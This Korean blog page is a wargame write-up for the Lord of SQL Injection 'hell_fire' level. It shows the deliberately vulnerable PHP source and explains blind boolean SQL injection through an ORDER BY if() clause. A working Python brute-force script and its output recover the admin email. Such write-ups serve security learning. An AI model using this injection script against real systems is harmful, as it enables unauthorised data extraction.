@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html class="no-js">
+  <head>
+	<meta charset="utf-8">
+	<title>[Lord of SQL Injection] LoS - hell_fire 문제풀이 | mingzzi</title>
+	<meta name="description" content="이번 문제에는 위에 갑자기 표가 나온다.그리고 pw를 맞추는게 아니라 이번에는 email 주소를 알아야 한다.">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<!-- CSS -->
+	<link rel="stylesheet" href="/assets/css/main.css">
+
+	<!--Favicon-->
+	<link rel="shortcut icon" href="/assets/favicon.ico" type="image/x-icon">
+
+	<!-- Canonical -->
+	<link rel="canonical" href="/wargame/lord%20of%20sql%20injection/2018/08/23/los-hell_fire.html">
+
+	<!-- RSS -->
+	<link rel="alternate" type="application/atom+xml" title="mingzzi" href="/feed.xml" />
+
+	<!-- Font Awesome -->
+	<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+	<!-- Google Fonts -->
+	
+	<link href="https://fonts.googleapis.com/css?family=Nanum+Gothic:400,700" rel="stylesheet">
+	
+
+	<!-- KaTeX -->
+	
+	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.css">
+	<script src="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.js"></script>
+	
+
+	<!-- Google Analytics -->
+	
+	<script>
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+	ga('create', 'UA-130304424-1', 'auto');
+	ga('send', 'pageview');
+	</script>
+	
+</head>
+
+  <header class="site-header">
+	<div class="branding">
+		
+		<a href="/">
+			<img class="avatar" src="/assets/img/blogmark.png" alt=""/>
+		</a>
+		
+		<h1 class="site-title">
+			<a href="/">mingzzi</a>
+		</h1>
+		<nav class="site-nav">
+				<ul>
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/about/">
+									About
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/tags.html">
+									tags
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+
+					<!-- Search bar -->
+					
+					<li>
+					<form action="/search.html" method="get">
+						<input type="text" id="search-box" name="query" placeholder="Search" class="">
+						<button type="submit" class="">
+							<i class="fa fa-fw fa-search"></i>
+						</button>
+					</form>
+					</li>
+					
+				</ul>
+		</nav>
+	</div>
+
+	<div class="site-category">
+			<ul class='cat1'>
+				<li><a href="/">Home</a></li>
+				<li><a href="/">Pentesting</a>
+					<ul>
+						<li><a href="/Pentest/iOS">iOS</a></li>
+						<li><a href="/Pentest/Android">Android</a></li>
+						<li><a href="/Pentest/PWeb">Web</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Wargame</a>
+					<ul>
+						<li><a href="/Wargame/LoS">Load of SQL Injection</a></li>
+						<li><a href="/Wargame/Pwnkr">Pwnable.kr</a></li>
+						<li><a href="/Wargame/Warkr">Wargame.kr</a></li>
+						<li><a href="/Wargame/XG">XSS Game</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">CTF</a>
+					<ul>
+						<li><a href="/CTF/2018">2018</a></li>
+						<li><a href="/CTF/2019">2019</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Error</a>
+					<ul>
+						<li><a href="/Error/Linux">Linux</a></li>
+						<li><a href="/Error/Python">Python</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Development</a>
+					<ul>
+						<li><a href="/Develop/Database">Database</a></li>
+						<li><a href="/Develop/Blog">Github Blog</a></li>
+						<li><a href="/Develop/DWeb">Web</a></li>
+						<li><a href="/Develop/Docker">Docker</a></li>
+						<li><a href="/Develop/Basic">Basic</a></li>
+					</ul>
+				</li>
+			</ul>
+		</div>
+
+</header>
+
+  <body>
+    <div class="content">
+      <article >
+  <header style="background-image: url('/')">
+    <h1 class="title">[Lord of SQL Injection] LoS - hell_fire 문제풀이</h1>
+    
+    <p class="meta">
+      August 23, 2018
+      
+    </p>
+  </header>
+  <section class="post-content"><p>이번 문제에는 위에 갑자기 표가 나온다.</p>
+
+<p>그리고 <code class="highlighter-rouge">pw</code>를 맞추는게 아니라 이번에는 <code class="highlighter-rouge">email</code> 주소를 알아야 한다.</p>
+
+<!--more-->
+
+<p>코드는 다음과 같다.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>------------------------------------------------------------------------------------------
+query : select id,email,score from prob_hell_fire where 1 order by
+------------------------------------------------------------------------------------------
+
+<span class="cp">&lt;?php</span>
+  <span class="k">include</span> <span class="s2">"./config.php"</span><span class="p">;</span>
+  <span class="nx">login_chk</span><span class="p">();</span>
+  <span class="nx">dbconnect</span><span class="p">();</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/prob|_|\.|proc|union/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">order</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack ~_~"</span><span class="p">);</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select id,email,score from prob_hell_fire where 1 order by </span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">order</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span>
+  <span class="k">echo</span> <span class="s2">"&lt;table border=1&gt;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;email&lt;/th&gt;&lt;th&gt;score&lt;/th&gt;"</span><span class="p">;</span>
+  <span class="nv">$rows</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
+  <span class="k">while</span><span class="p">((</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$rows</span><span class="p">))){</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"admin"</span><span class="p">)</span> <span class="nv">$result</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"**************"</span><span class="p">;</span>
+    <span class="k">echo</span> <span class="s2">"&lt;tr&gt;&lt;td&gt;</span><span class="si">{</span><span class="nv">$result</span><span class="p">[</span><span class="nx">id</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;/td&gt;&lt;td&gt;</span><span class="si">{</span><span class="nv">$result</span><span class="p">[</span><span class="nx">email</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;/td&gt;&lt;td&gt;</span><span class="si">{</span><span class="nv">$result</span><span class="p">[</span><span class="nx">score</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;/td&gt;&lt;/tr&gt;"</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">echo</span> <span class="s2">"&lt;/table&gt;&lt;hr&gt;query : &lt;strong&gt;</span><span class="si">{</span><span class="nv">$query</span><span class="si">}</span><span class="s2">&lt;/strong&gt;&lt;hr&gt;"</span><span class="p">;</span>
+
+  <span class="nv">$_GET</span><span class="p">[</span><span class="nx">email</span><span class="p">]</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">email</span><span class="p">]);</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select email from prob_hell_fire where id='admin' and email='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">email</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">((</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'email'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]))</span> <span class="nx">solve</span><span class="p">(</span><span class="s2">"hell_fire"</span><span class="p">);</span>
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>코드를 살펴보면 내가 입력한 값은 <code class="highlighter-rouge">order by</code> 뒤에 들어간다.</p>
+
+<p>그리고 <code class="highlighter-rouge">id, email, score</code>를 추출 하는데, 이 때 <code class="highlighter-rouge">admin</code>의 <code class="highlighter-rouge">email</code> 주소는 <code class="highlighter-rouge">**************</code>로 처리된다.</p>
+
+<p>쿼리문 위에는 표가 나타나는데, 형태는 다음과 같다.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>id</th>
+      <th> </th>
+      <th>email</th>
+      <th> </th>
+      <th>score</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
+
+<p>일단 무슨 값이 저장되어 있는지 확인하기 위해서, <code class="highlighter-rouge">?order=id</code>를 입력해 보았다.</p>
+
+<p>그랬더니 표에 다음과 같이 데이터가 나왔다.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>id</th>
+      <th> </th>
+      <th>email</th>
+      <th> </th>
+      <th>score</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>admin</td>
+      <td> </td>
+      <td><strong>**</strong><strong>**</strong>**</td>
+      <td> </td>
+      <td>200</td>
+    </tr>
+    <tr>
+      <td>rubiya</td>
+      <td> </td>
+      <td>rubiya805@gmail.cm</td>
+      <td> </td>
+      <td>100</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>그래서 문제를 어떻게 풀어야하는지 고민하다가, <code class="highlighter-rouge">order by</code> 뒤에 <code class="highlighter-rouge">if</code>문을 사용할 수 있다는 사실을 깨달았다.</p>
+
+<p>내가 처음에 생각 한 방법은, <code class="highlighter-rouge">?order=if(id='admin' and length(email)&gt;0, score, id)</code>를 쿼리스트링으로 넘겨주는 것이었다.</p>
+
+<p>그럼 쿼리문이 아래와 같이 완성된다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select id,email,score from prob_hell_fire where 1 order by if(id='admin' and length(email)&gt;0, score, id)
+</code></pre></div></div>
+
+<p>그렇다면 만약 <code class="highlighter-rouge">id</code>가 <code class="highlighter-rouge">admin</code>이고, 그 <code class="highlighter-rouge">email</code>의 길이가 <code class="highlighter-rouge">0</code>보다 크다면 조건이 참이기 때문에 <code class="highlighter-rouge">score</code>를 기준으로 정렬 할 것이고, 아니라면 <code class="highlighter-rouge">id</code>를 기준으로 정렬 할 것이라고 생각했다.</p>
+
+<p>그럼 참이라면 <code class="highlighter-rouge">rubiya</code> 행이, 거짓이라면 <code class="highlighter-rouge">admin</code>의 행이 위에 나타나게 될 것이다.</p>
+
+<p>실제로 내가 데이터베이스에서 테스트 해 보면 정상적으로 실행 됬었다.</p>
+
+<p>그런데 문제에서는 그게 안됬다.</p>
+
+<p><code class="highlighter-rouge">id</code>를 <code class="highlighter-rouge">rubiya</code>로 두고 테스트를 할 때는 제대로 참, 거짓에 따라 <code class="highlighter-rouge">score</code> 혹은 <code class="highlighter-rouge">id</code>를 기준으로 정렬했다.</p>
+
+<p>그런데 <code class="highlighter-rouge">id='admin'</code>으로 두고 테스트 하면 무조건 <code class="highlighter-rouge">admin</code>인 행이 위에 나온다.</p>
+
+<p>왜 때문인지 모르겠다.</p>
+
+<p>그리고 또 한가지 이상한 점이 있는데, 쿼리스트링으로 <code class="highlighter-rouge">?order=if(id='admin' and length(email)&gt;0, score, 9999)</code>를 넘겨주면 일단 참, 거짓 반응을 구분할 수 있다.</p>
+
+<p>하지만 <code class="highlighter-rouge">참</code>일 때 <code class="highlighter-rouge">score</code>를 기준으로 정렬하는게 아니라, <code class="highlighter-rouge">거짓</code>일 때 <code class="highlighter-rouge">score</code>를 기준으로 정렬을 해 조건이 맞지 않으면 <code class="highlighter-rouge">rubiya</code>가 위에 나왔다.</p>
+
+<p>얘도 왜그러는지 모르겠다…ㅎ</p>
+
+<p>그런데 어쨌든 참, 거짓에 따라 결과가 구분이 되길래 아래와 같이 코드를 짜서 돌려 보았다.</p>
+
+<p>만약 값이 참이라면 <code class="highlighter-rouge">admin</code> 행이, 거짓이라면 <code class="highlighter-rouge">rubiya</code> 행이 위에 나와서, <code class="highlighter-rouge">admin</code> 행이 위에 나온다면 그 값을 뽑아오게 했다.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">urllib2</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">flag</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">length</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"http://los.rubiya.kr/hell_fire_309d5f471fbdd4722d221835380bb805.php?order="</span>
+<span class="n">session</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">PHPSESSID</span> <span class="o">=</span> <span class="s">"YOUR SESSION ID"</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="s">"[+] Start"</span>
+
+<span class="k">print</span> <span class="s">"[+] Find length of the password"</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">30</span><span class="p">):</span>
+	<span class="k">try</span><span class="p">:</span>
+		<span class="n">query</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"if((id='admin' and length(email)="</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s">"), score, 9999)"</span>
+		<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">session</span><span class="p">)</span>
+	<span class="k">except</span><span class="p">:</span>
+		<span class="k">print</span> <span class="s">"[-] Error occur"</span>
+		<span class="k">continue</span>
+	<span class="k">if</span> <span class="s">'&lt;td&gt;200&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;rubiya&lt;/td&gt;'</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+		<span class="n">length</span> <span class="o">=</span> <span class="n">i</span>
+		<span class="k">break</span>
+
+<span class="k">print</span> <span class="s">"[+] Found length : "</span><span class="p">,</span> <span class="n">length</span>
+
+<span class="k">print</span> <span class="s">"[+] Find password"</span>
+
+<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
+	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">33</span><span class="p">,</span> <span class="mi">128</span><span class="p">):</span>
+		<span class="k">try</span><span class="p">:</span>
+			<span class="n">query</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"if((id='admin' and ord(substr(email, "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="o">+</span> <span class="s">", 1))="</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s">"), score, 9999)"</span>
+			<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">session</span><span class="p">)</span>
+		<span class="k">except</span><span class="p">:</span>
+			<span class="k">print</span> <span class="s">"[-] Error occur"</span>
+			<span class="k">continue</span>
+
+		<span class="k">if</span> <span class="s">'&lt;td&gt;200&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;rubiya&lt;/td&gt;'</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+			<span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+			<span class="k">print</span> <span class="s">"[+] Found "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">),</span> <span class="s">":"</span><span class="p">,</span> <span class="n">flag</span>
+			<span class="k">break</span>
+
+<span class="k">print</span> <span class="s">"[+] Found password : "</span><span class="p">,</span> <span class="n">flag</span>
+<span class="k">print</span> <span class="s">"[+] End"</span>
+</code></pre></div></div>
+
+<p>그랬더니 소스코드가 정상적으로 실행되서 문제를 풀 수 있었다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python ex.py 
+[+] Start
+[+] Find length of the password
+[+] Found length :  28
+[+] Find password
+[+] Found 1 : a
+[+] Found 2 : ad
+[+] Found 3 : adm
+[+] Found 4 : admi
+[+] Found 5 : admin
+[+] Found 6 : admin_
+[+] Found 7 : admin_s
+[+] Found 8 : admin_se
+[+] Found 9 : admin_sec
+[+] Found 10 : admin_secu
+[+] Found 11 : admin_secur
+[+] Found 12 : admin_secure
+[+] Found 13 : admin_secure_
+[+] Found 14 : admin_secure_e
+[+] Found 15 : admin_secure_em
+[+] Found 16 : admin_secure_ema
+[+] Found 17 : admin_secure_emai
+[+] Found 18 : admin_secure_email
+[+] Found 19 : admin_secure_email@
+[+] Found 20 : admin_secure_email@e
+[+] Found 21 : admin_secure_email@em
+[+] Found 22 : admin_secure_email@ema
+[+] Found 23 : admin_secure_email@emai
+[+] Found 24 : admin_secure_email@emai1
+[+] Found 25 : admin_secure_email@emai1.
+[+] Found 26 : admin_secure_email@emai1.c
+[+] Found 27 : admin_secure_email@emai1.co
+[+] Found 28 : admin_secure_email@emai1.com
+[+] Found password :  admin_secure_email@emai1.com
+[+] End
+</code></pre></div></div>
+
+<p>이 이메일 주소를 아래와 같이 쿼리스트링으로 넘겨주었더니 문제를 풀 수 있었다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?email=admin_secure_email@emai1.com
+</code></pre></div></div>
+
+<p>근데 왜 처음에 생각한 방법이 먹히지 않는지, 왜 거짓일 때 <code class="highlighter-rouge">score</code>를 기준으로 정렬하는지는 아직도 모르겠다.</p>
+
+<p>나중에 알게된다면 정리 해 둬야겠다.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>------------------------------------------------------------------------------------------
+query : select id,email,score from prob_hell_fire where 1 order by
+------------------------------------------------------------------------------------------
+
+HELL_FIRE Clear!
+<span class="cp">&lt;?php</span>
+  <span class="k">include</span> <span class="s2">"./config.php"</span><span class="p">;</span>
+  <span class="nx">login_chk</span><span class="p">();</span>
+  <span class="nx">dbconnect</span><span class="p">();</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/prob|_|\.|proc|union/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">order</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack ~_~"</span><span class="p">);</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select id,email,score from prob_hell_fire where 1 order by </span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">order</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span>
+  <span class="k">echo</span> <span class="s2">"&lt;table border=1&gt;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;email&lt;/th&gt;&lt;th&gt;score&lt;/th&gt;"</span><span class="p">;</span>
+  <span class="nv">$rows</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
+  <span class="k">while</span><span class="p">((</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$rows</span><span class="p">))){</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"admin"</span><span class="p">)</span> <span class="nv">$result</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"**************"</span><span class="p">;</span>
+    <span class="k">echo</span> <span class="s2">"&lt;tr&gt;&lt;td&gt;</span><span class="si">{</span><span class="nv">$result</span><span class="p">[</span><span class="nx">id</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;/td&gt;&lt;td&gt;</span><span class="si">{</span><span class="nv">$result</span><span class="p">[</span><span class="nx">email</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;/td&gt;&lt;td&gt;</span><span class="si">{</span><span class="nv">$result</span><span class="p">[</span><span class="nx">score</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;/td&gt;&lt;/tr&gt;"</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">echo</span> <span class="s2">"&lt;/table&gt;&lt;hr&gt;query : &lt;strong&gt;</span><span class="si">{</span><span class="nv">$query</span><span class="si">}</span><span class="s2">&lt;/strong&gt;&lt;hr&gt;"</span><span class="p">;</span>
+
+  <span class="nv">$_GET</span><span class="p">[</span><span class="nx">email</span><span class="p">]</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">email</span><span class="p">]);</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select email from prob_hell_fire where id='admin' and email='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">email</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">((</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'email'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]))</span> <span class="nx">solve</span><span class="p">(</span><span class="s2">"hell_fire"</span><span class="p">);</span>
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">HELL_FIRE Clear!!</code></p>
+</section>
+  
+<footer>
+  <div class="tags">
+    
+    <a class="tag" href="/tags#Write-up">#Write-up</a>
+    
+    <a class="tag" href="/tags#Lord of SQL Injection">#Lord of SQL Injection</a>
+    
+  </div>
+</footer>
+
+
+</article>
+<!-- Disqus -->
+<a href="https://devYurim.github.io/wargame/lord%20of%20sql%20injection/2018/08/23/los-hell_fire.html#disqus_thread"></a>
+
+<div class="comments">
+  
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://https-devyurim-github-io-1.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                            
+
+</div>
+
+
+<!-- Post navigation -->
+
+  <div id="post-nav">
+  
+  <div id="previous-post" class="post-nav-post">
+      <p>Previous post</p>
+      <a href="/wargame/lord%20of%20sql%20injection/2018/08/22/los-dark_eyes.html">
+        [Lord of SQL Injection] LoS - dark_eyes 문제풀이
+      </a>
+  </div>
+  
+  
+  <div id="next-post" class="post-nav-post">
+      <p>Next post</p>
+      <a href="/wargame/lord%20of%20sql%20injection/2018/08/24/los-evil_wizard.html">
+        [Lord of SQL Injection] LoS - evil_wizard 문제풀이
+      </a>
+  </div>
+  
+</div>
+
+
+
+    </div>
+    
+<script src="/assets/js/katex_init.js"></script>
+
+
+
+<footer class="site-footer">
+	<p class="text">Powered by <a href="https://jekyllrb.com/">Jekyll</a> with <a href="https://github.com/rohanchandra/type-theme">Type Theme</a>
+</p>
+</footer>
+
+
+    <script id="dsq-count-scr" src="//.disqus.com/count.js" async></script>
+
+    <!-- Google Analytics Tracking code -->
+<script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', '']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+</script>
+
+  </body>
+</html>
